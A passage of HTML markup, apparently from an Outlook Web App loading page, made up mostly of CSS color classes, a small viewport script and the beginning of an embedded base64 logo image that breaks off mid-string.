            .ms-font-color-neutralLighterAlt,.ms-fontColor-neutralLighterAlt,.ms-fcl-nlra,.ms-font-color-neutralLighterAlt-hover:hover,.ms-font-color-neutralLighterAlt-focus:focus,.ms-font-color-neutralLighterAlt-before:before,.ms-fcl-nlra-h:hover,.ms-fcl-nlra-f:focus,.ms-fcl-nlra-b:before {
                color: #f8f8f8
            }

            .ms-font-color-white,.ms-fontColor-white,.ms-fcl-w,.ms-font-color-white-hover:hover,.ms-font-color-white-focus:focus,.ms-font-color-white-before:before,.ms-fcl-w-h:hover,.ms-fcl-w-f:focus,.ms-fcl-w-b:before {
                color: #fff
            }
        </style>
        <style>
            .ms-bg-color-yellow,.ms-bgc-y,.ms-bg-color-yellow-hover:hover,.ms-bg-color-yellow-before:before,.ms-bgc-y-h:hover,.ms-bgc-y-b:before {
                background-color: #ffb900
            }

            .ms-bg-color-yellowLight,.ms-bgc-yl,.ms-bg-color-yellowLight-hover:hover,.ms-bg-color-yellowLight-before:before,.ms-bgc-yl-h:hover,.ms-bgc-yl-b:before {
                background-color: #fff100
            }

            .ms-bg-color-orange,.ms-bgc-o,.ms-bg-color-orange-hover:hover,.ms-bg-color-orange-before:before,.ms-bgc-o-h:hover,.ms-bgc-o-b:before {
                background-color: #d83b01
            }

            .ms-bg-color-orangeLight,.ms-bgc-ol,.ms-bg-color-orangeLight-hover:hover,.ms-bg-color-orangeLight-before:before,.ms-bgc-ol-h:hover,.ms-bgc-ol-b:before {
                background-color: #ff8c00
            }

            .ms-bg-color-redDark,.ms-bgc-rd,.ms-bg-color-redDark-hover:hover,.ms-bg-color-redDark-before:before,.ms-bgc-rd-h:hover,.ms-bgc-rd-b:before {
                background-color: #a80000
            }

            .ms-bg-color-red,.ms-bgc-r,.ms-bg-color-red-hover:hover,.ms-bg-color-red-before:before,.ms-bgc-r-h:hover,.ms-bgc-r-b:before {
                background-color: #e81123
            }

            .ms-bg-color-magentaDark,.ms-bgc-md,.ms-bg-color-magentaDark-hover:hover,.ms-bg-color-magentaDark-before:before,.ms-bgc-md-h:hover,.ms-bgc-md-b:before {
                background-color: #5c005c
            }

            .ms-bg-color-magenta,.ms-bgc-m,.ms-bg-color-magenta-hover:hover,.ms-bg-color-magenta-before:before,.ms-bgc-m-h:hover,.ms-bgc-m-b:before {
                background-color: #b4009e
            }

            .ms-bg-color-magentaLight,.ms-bgc-ml,.ms-bg-color-magentaLight-hover:hover,.ms-bg-color-magentaLight-before:before,.ms-bgc-ml-h:hover,.ms-bgc-ml-b:before {
                background-color: #e3008c
            }

            .ms-bg-color-purpleDark,.ms-bgc-pd,.ms-bg-color-purpleDark-hover:hover,.ms-bg-color-purpleDark-before:before,.ms-bgc-pd-h:hover,.ms-bgc-pd-b:before {
                background-color: #32145a
            }

            .ms-bg-color-purple,.ms-bgc-p,.ms-bg-color-purple-hover:hover,.ms-bg-color-purple-before:before,.ms-bgc-p-h:hover,.ms-bgc-p-b:before {
                background-color: #5c2d91
            }

            .ms-bg-color-purpleLight,.ms-bgc-pl,.ms-bg-color-purpleLight-hover:hover,.ms-bg-color-purpleLight-before:before,.ms-bgc-pl-h:hover,.ms-bgc-pl-b:before {
                background-color: #b4a0ff
            }

            .ms-bg-color-blueDark,.ms-bgc-bd,.ms-bg-color-blueDark-hover:hover,.ms-bg-color-blueDark-before:before,.ms-bgc-bd-h:hover,.ms-bgc-bd-b:before {
                background-color: #002050
            }

            .ms-bg-color-blueMid,.ms-bgc-bm,.ms-bg-color-blueMid-hover:hover,.ms-bg-color-blueMid-before:before,.ms-bgc-bm-h:hover,.ms-bgc-bm-b:before {
                background-color: #00188f
            }

            .ms-bg-color-blue,.ms-bgc-blu,.ms-bg-color-blue-hover:hover,.ms-bg-color-blue-before:before,.ms-bgc-blu-h:hover,.ms-bgc-blu-b:before {
                background-color: #0078d7
            }

            .ms-bg-color-blueLight,.ms-bgc-bl,.ms-bg-color-blueLight-hover:hover,.ms-bg-color-blueLight-before:before,.ms-bgc-bl-h:hover,.ms-bgc-bl-b:before {
                background-color: #00bcf2
            }

            .ms-bg-color-tealDark,.ms-bgc-ted,.ms-bg-color-tealDark-hover:hover,.ms-bg-color-tealDark-before:before,.ms-bgc-ted-h:hover,.ms-bgc-ted-b:before {
                background-color: #004b50
            }

            .ms-bg-color-teal,.ms-bgc-t,.ms-bg-color-teal-hover:hover,.ms-bg-color-teal-before:before,.ms-bgc-t-h:hover,.ms-bgc-t-b:before {
                background-color: #008272
            }

            .ms-bg-color-tealLight,.ms-bgc-tel,.ms-bg-color-tealLight-hover:hover,.ms-bg-color-tealLight-before:before,.ms-bgc-tel-h:hover,.ms-bgc-tel-b:before {
                background-color: #00b294
            }

            .ms-bg-color-greenDark,.ms-bgc-gd,.ms-bg-color-greenDark-hover:hover,.ms-bg-color-greenDark-before:before,.ms-bgc-gd-h:hover,.ms-bgc-gd-b:before {
                background-color: #004b1c
            }

            .ms-bg-color-green,.ms-bgc-g,.ms-bg-color-green-hover:hover,.ms-bg-color-green-before:before,.ms-bgc-g-h:hover,.ms-bgc-g-b:before {
                background-color: #107c10
            }

            .ms-bg-color-greenLight,.ms-bgc-gl,.ms-bg-color-greenLight-hover:hover,.ms-bg-color-greenLight-before:before,.ms-bgc-gl-h:hover,.ms-bgc-gl-b:before {
                background-color: #bad80a
            }

            .ms-border-color-yellow,.ms-bcl-y,.ms-border-color-yellow-hover:hover,.ms-border-color-yellow-before:before,.ms-bcl-y-h:hover,.ms-bcl-y-b:before {
                border-color: #ffb900
            }

            .ms-border-color-yellowLight,.ms-bcl-yl,.ms-border-color-yellowLight-hover:hover,.ms-border-color-yellowLight-before:before,.ms-bcl-yl-h:hover,.ms-bcl-yl-b:before {
                border-color: #fff100
            }

            .ms-border-color-orange,.ms-bcl-o,.ms-border-color-orange-hover:hover,.ms-border-color-orange-before:before,.ms-bcl-o-h:hover,.ms-bcl-o-b:before {
                border-color: #d83b01
            }

            .ms-border-color-orangeLight,.ms-bcl-ol,.ms-border-color-orangeLight-hover:hover,.ms-border-color-orangeLight-before:before,.ms-bcl-ol-h:hover,.ms-bcl-ol-b:before {
                border-color: #ff8c00
            }

            .ms-border-color-redDark,.ms-bcl-rd,.ms-border-color-redDark-hover:hover,.ms-border-color-redDark-before:before,.ms-bcl-rd-h:hover,.ms-bcl-rd-b:before {
                border-color: #a80000
            }

            .ms-border-color-red,.ms-bcl-r,.ms-border-color-red-hover:hover,.ms-border-color-red-before:before,.ms-bcl-r-h:hover,.ms-bcl-r-b:before {
                border-color: #e81123
            }

            .ms-border-color-magentaDark,.ms-bcl-md,.ms-border-color-magentaDark-hover:hover,.ms-border-color-magentaDark-before:before,.ms-bcl-md-h:hover,.ms-bcl-md-b:before {
                border-color: #5c005c
            }

            .ms-border-color-magenta,.ms-bcl-m,.ms-border-color-magenta-hover:hover,.ms-border-color-magenta-before:before,.ms-bcl-m-h:hover,.ms-bcl-m-b:before {
                border-color: #b4009e
            }

            .ms-border-color-magentaLight,.ms-bcl-ml,.ms-border-color-magentaLight-hover:hover,.ms-border-color-magentaLight-before:before,.ms-bcl-ml-h:hover,.ms-bcl-ml-b:before {
                border-color: #e3008c
            }

            .ms-border-color-purpleDark,.ms-bcl-pd,.ms-border-color-purpleDark-hover:hover,.ms-border-color-purpleDark-before:before,.ms-bcl-pd-h:hover,.ms-bcl-pd-b:before {
                border-color: #32145a
            }

            .ms-border-color-purple,.ms-bcl-p,.ms-border-color-purple-hover:hover,.ms-border-color-purple-before:before,.ms-bcl-p-h:hover,.ms-bcl-p-b:before {
                border-color: #5c2d91
            }

            .ms-border-color-purpleLight,.ms-bcl-pl,.ms-border-color-purpleLight-hover:hover,.ms-border-color-purpleLight-before:before,.ms-bcl-pl-h:hover,.ms-bcl-pl-b:before {
                border-color: #b4a0ff
            }

            .ms-border-color-blueDark,.ms-bcl-bd,.ms-border-color-blueDark-hover:hover,.ms-border-color-blueDark-before:before,.ms-bcl-bd-h:hover,.ms-bcl-bd-b:before {
                border-color: #002050
            }

            .ms-border-color-blueMid,.ms-bcl-bm,.ms-border-color-blueMid-hover:hover,.ms-border-color-blueMid-before:before,.ms-bcl-bm-h:hover,.ms-bcl-bm-b:before {
                border-color: #00188f
            }

            .ms-border-color-blue,.ms-bcl-blu,.ms-border-color-blue-hover:hover,.ms-border-color-blue-before:before,.ms-bcl-blu-h:hover,.ms-bcl-blu-b:before {
                border-color: #0078d7
            }

            .ms-border-color-blueLight,.ms-bcl-bl,.ms-border-color-blueLight-hover:hover,.ms-border-color-blueLight-before:before,.ms-bcl-bl-h:hover,.ms-bcl-bl-b:before {
                border-color: #00bcf2
            }

            .ms-border-color-tealDark,.ms-bcl-ted,.ms-border-color-tealDark-hover:hover,.ms-border-color-tealDark-before:before,.ms-bcl-ted-h:hover,.ms-bcl-ted-b:before {
                border-color: #004b50
            }

            .ms-border-color-teal,.ms-bcl-t,.ms-border-color-teal-hover:hover,.ms-border-color-teal-before:before,.ms-bcl-t-h:hover,.ms-bcl-t-b:before {
                border-color: #008272
            }

            .ms-border-color-tealLight,.ms-bcl-tel,.ms-border-color-tealLight-hover:hover,.ms-border-color-tealLight-before:before,.ms-bcl-tel-h:hover,.ms-bcl-tel-b:before {
                border-color: #00b294
            }

            .ms-border-color-greenDark,.ms-bcl-gd,.ms-border-color-greenDark-hover:hover,.ms-border-color-greenDark-before:before,.ms-bcl-gd-h:hover,.ms-bcl-gd-b:before {
                border-color: #004b1c
            }

            .ms-border-color-green,.ms-bcl-g,.ms-border-color-green-hover:hover,.ms-border-color-green-before:before,.ms-bcl-g-h:hover,.ms-bcl-g-b:before {
                border-color: #107c10
            }

            .ms-border-color-greenLight,.ms-bcl-gl,.ms-border-color-greenLight-hover:hover,.ms-border-color-greenLight-before:before,.ms-bcl-gl-h:hover,.ms-bcl-gl-b:before {
                border-color: #bad80a
            }

            .ms-font-color-yellow,.ms-fcl-y,.ms-font-color-yellow-hover:hover,.ms-font-color-yellow-before:before,.ms-fcl-y-h:hover,.ms-fcl-y-b:before {
                color: #ffb900
            }

            .ms-font-color-yellowLight,.ms-fcl-yl,.ms-font-color-yellowLight-hover:hover,.ms-font-color-yellowLight-before:before,.ms-fcl-yl-h:hover,.ms-fcl-yl-b:before {
                color: #fff100
            }

            .ms-font-color-orange,.ms-fcl-o,.ms-font-color-orange-hover:hover,.ms-font-color-orange-before:before,.ms-fcl-o-h:hover,.ms-fcl-o-b:before {
                color: #d83b01
            }

            .ms-font-color-orangeLight,.ms-fcl-ol,.ms-font-color-orangeLight-hover:hover,.ms-font-color-orangeLight-before:before,.ms-fcl-ol-h:hover,.ms-fcl-ol-b:before {
                color: #ff8c00
            }

            .ms-font-color-redDark,.ms-fcl-rd,.ms-font-color-redDark-hover:hover,.ms-font-color-redDark-before:before,.ms-fcl-rd-h:hover,.ms-fcl-rd-b:before {
                color: #a80000
            }

            .ms-font-color-red,.ms-fcl-r,.ms-font-color-red-hover:hover,.ms-font-color-red-before:before,.ms-fcl-r-h:hover,.ms-fcl-r-b:before {
                color: #e81123
            }

            .ms-font-color-magentaDark,.ms-fcl-md,.ms-font-color-magentaDark-hover:hover,.ms-font-color-magentaDark-before:before,.ms-fcl-md-h:hover,.ms-fcl-md-b:before {
                color: #5c005c
            }

            .ms-font-color-magenta,.ms-fcl-m,.ms-font-color-magenta-hover:hover,.ms-font-color-magenta-before:before,.ms-fcl-m-h:hover,.ms-fcl-m-b:before {
                color: #b4009e
            }

            .ms-font-color-magentaLight,.ms-fcl-ml,.ms-font-color-magentaLight-hover:hover,.ms-font-color-magentaLight-before:before,.ms-fcl-ml-h:hover,.ms-fcl-ml-b:before {
                color: #e3008c
            }

            .ms-font-color-purpleDark,.ms-fcl-pd,.ms-font-color-purpleDark-hover:hover,.ms-font-color-purpleDark-before:before,.ms-fcl-pd-h:hover,.ms-fcl-pd-b:before {
                color: #32145a
            }

            .ms-font-color-purple,.ms-fcl-p,.ms-font-color-purple-hover:hover,.ms-font-color-purple-before:before,.ms-fcl-p-h:hover,.ms-fcl-p-b:before {
                color: #5c2d91
            }

            .ms-font-color-purpleLight,.ms-fcl-pl,.ms-font-color-purpleLight-hover:hover,.ms-font-color-purpleLight-before:before,.ms-fcl-pl-h:hover,.ms-fcl-pl-b:before {
                color: #b4a0ff
            }

            .ms-font-color-blueDark,.ms-fcl-bd,.ms-font-color-blueDark-hover:hover,.ms-font-color-blueDark-before:before,.ms-fcl-bd-h:hover,.ms-fcl-bd-b:before {
                color: #002050
            }

            .ms-font-color-blueMid,.ms-fcl-bm,.ms-font-color-blueMid-hover:hover,.ms-font-color-blueMid-before:before,.ms-fcl-bm-h:hover,.ms-fcl-bm-b:before {
                color: #00188f
            }

            .ms-font-color-blue,.ms-fcl-blu,.ms-font-color-blue-hover:hover,.ms-font-color-blue-before:before,.ms-fcl-blu-h:hover,.ms-fcl-blu-b:before {
                color: #0078d7
            }

            .ms-font-color-blueLight,.ms-fcl-bl,.ms-font-color-blueLight-hover:hover,.ms-font-color-blueLight-before:before,.ms-fcl-bl-h:hover,.ms-fcl-bl-b:before {
                color: #00bcf2
            }

            .ms-font-color-tealDark,.ms-fcl-ted,.ms-font-color-tealDark-hover:hover,.ms-font-color-tealDark-before:before,.ms-fcl-ted-h:hover,.ms-fcl-ted-b:before {
                color: #004b50
            }

            .ms-font-color-teal,.ms-fcl-t,.ms-font-color-teal-hover:hover,.ms-font-color-teal-before:before,.ms-fcl-t-h:hover,.ms-fcl-t-b:before {
                color: #008272
            }

            .ms-font-color-tealLight,.ms-fcl-tel,.ms-font-color-tealLight-hover:hover,.ms-font-color-tealLight-before:before,.ms-fcl-tel-h:hover,.ms-fcl-tel-b:before {
                color: #00b294
            }

            .ms-font-color-greenDark,.ms-fcl-gd,.ms-font-color-greenDark-hover:hover,.ms-font-color-greenDark-before:before,.ms-fcl-gd-h:hover,.ms-fcl-gd-b:before {
                color: #004b1c
            }

            .ms-font-color-green,.ms-fcl-g,.ms-font-color-green-hover:hover,.ms-font-color-green-before:before,.ms-fcl-g-h:hover,.ms-fcl-g-b:before {
                color: #107c10
            }

            .ms-font-color-greenLight,.ms-fcl-gl,.ms-font-color-greenLight-hover:hover,.ms-font-color-greenLight-before:before,.ms-fcl-gl-h:hover,.ms-fcl-gl-b:before {
                color: #bad80a
            }
        </style>
        <style>
            .owa-font-compose {
                font-family: Calibri,Arial,Helvetica,sans-serif
            }

            .owa-bg-color-neutral-orange {
                background-color: #D82300
            }

            .owa-bg-color-neutral-red {
                background-color: #A80F22
            }

            .owa-bg-color-neutral-yellow {
                background-color: #FFEE94
            }

            .owa-bg-color-neutral-green {
                background-color: #5DD255
            }

            .owa-bg-color-cal-green {
                background-color: #68A490
            }

            .owa-bg-color-cal-purple {
                background-color: #976CBE
            }

            .owa-border-color-neutral-orange {
                border-color: #D82300
            }

            .owa-border-color-neutral-red {
                border-color: #A80F22
            }

            .owa-border-color-neutral-yellow {
                border-color: #FFEE94
            }

            .owa-border-color-neutral-green {
                border-color: #5DD255
            }

            .owa-border-color-cal-green {
                border-color: #68A490
            }

            .owa-border-color-cal-purple {
                border-color: #976CBE
            }

            .owa-color-neutral-darkBlue {
                color: #00008B
            }

            .owa-color-neutral-orange {
                color: #D82300
            }

            .owa-color-neutral-red {
                color: #A80F22
            }

            .owa-color-neutral-yellow {
                color: #FFEE94
            }

            .owa-color-neutral-green {
                color: #5DD255
            }

            .owa-color-neutral-green-alt,.owa-color-neutral-green-alt:before {
                color: #107c10
            }

            .owa-color-cal-green {
                color: #68A490
            }

            .owa-color-cal-green-hover {
                color: #377353
            }

            .owa-color-cal-purple {
                color: #976CBE
            }

            .owa-color-cal-purple-hover {
                color: #67397B
            }

            .owa-color-cal-blue {
                color: #71C2EB
            }

            .owa-color-cal-brown {
                color: #AB9B81
            }

            .owa-color-cal-green-alt {
                color: #A9C47A
            }

            .owa-color-cal-grey {
                color: #999B9C
            }

            .owa-color-cal-orange {
                color: #E6975C
            }

            .owa-color-cal-pink {
                color: #CA6AAB
            }

            .owa-color-cal-red {
                color: #D57272
            }

            .owa-color-cal-teal {
                color: #7BCBC4
            }

            .owa-color-cal-yellow {
                color: #E3B75D
            }

            .owa-color-folder-brown {
                color: #EAC282
            }

            .ms-font-color-red {
                color: #E81123
            }

            .ms-font-color-redDark {
                color: #A80000
            }
        </style>
        <script>
            var HeaderImageTemplate = ".o365cs-topnavBGImage{background:url('prem/15.1.2375.37/resources/themes/@theme/images/0/headerbgmaing2.png'),url('prem/15.1.2375.37/resources/themes/@theme/images/0/headerbgmaing2.gif');width:1px;height:1px}";
        </script>
        <style id="HeaderImages"></style>
        <script>

            (function() {
                if ("-ms-user-select"in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                    var msViewportStyle = document.createElement("style");
                    msViewportStyle.appendChild(document.createTextNode("@-ms-viewport{width:auto!important}"));
                    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
                }
            }
            )();
        </script>
        <style>
            body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
            }

            #owaLoading {
                background-color: #FFF;
                width: 100%;
                height: 100%;
                position: absolute;
                z-index: 10001;
            }

            #loadingLogo, #loadingSpinner, #statusText {
                display: block;
                margin-left: auto;
                margin-right: auto;
                text-align: center;
            }

            #loadingLogo {
                padding-top: 174px;
                padding-bottom: 22px;
            }

            .tnarrow #loadingLogo {
                padding-top: 52px;
            }

            #statusText {
                color: #0072c6;
                font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
                font-size: 12px;
                margin-top: 20px;
            }

            #statusText > span {
                display: none;
                margin-left: auto;
                margin-right: auto;
                line-height: 11px;
            }

            #statusText.script > .script {
                display: inline;
            }

            #statusText.scriptDelay > .scriptDelay {
                display: inline;
            }

            #statusText.data > .data {
                display: inline;
            }

            #statusText.dataDelay > .dataDelay {
                display: inline;
            }

            #statusText.render > .render {
                display: inline;
            }
        </style>
    </head>
    <!--[if IE 8 ]> <body class="ie8 ms-fwt-r"> <![endif]-->
    <!--[if (gte IE 9)|!(IE)]><!-->
    <body class="notIE8 ms-fwt-r">
        <!--<![endif]-->
        <div id="owaLoading">
            <img id="loadingLogo" alt="Outlook" src='data:image/png;base64,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